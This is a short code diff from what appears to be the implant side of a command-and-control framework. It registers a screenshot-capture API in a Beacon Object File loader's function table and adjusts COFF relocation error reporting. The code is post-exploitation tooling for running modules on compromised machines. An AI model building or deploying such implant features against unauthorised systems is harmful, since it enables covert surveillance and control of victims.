@@ -16,7 +16,7 @@ void InitBofOutputData()
 	}
 }
 
-#define BEACON_FUNCTIONS_COUNT 26
+#define BEACON_FUNCTIONS_COUNT 27
 
 BOF_API BeaconFunctions[BEACON_FUNCTIONS_COUNT] = {
 
@@ -58,6 +58,9 @@ BOF_API BeaconFunctions[BEACON_FUNCTIONS_COUNT] = {
 	{ HASH_FUNC_BEACONADDVALUE,               BeaconAddValue },
 	{ HASH_FUNC_BEACONGETVALUE,               BeaconGetValue },
 	{ HASH_FUNC_BEACONREMOVEVALUE,            BeaconRemoveValue },
+
+	/// 1 - Adaptix APIs
+	{ HASH_FUNC_AXADDSCREENSHOT, AxAddScreenshot },
 
 	/// 5 - Other APIs
 
@@ -170,8 +173,8 @@ bool ProcessRelocations(unsigned char* coffFile, COF_HEADER* pHeader, PCHAR* map
 			if (pSymbol.Name.cName[0] != 0) { // Internal Symbol
 				int sectionNumber = pSymbol.SectionNumber - 1;
 				if (sectionNumber < 0 || sectionNumber >= pHeader->NumberOfSections) {
-					BeaconOutput(BOF_ERROR_PARSE, NULL, 0);
-					return FALSE;
+					BeaconOutput(BOF_ERROR_SYMBOL, pSymbol.Name.cName, StrLenA(pSymbol.Name.cName));
+					status = FALSE;
 				}
 
 #ifdef _WIN64
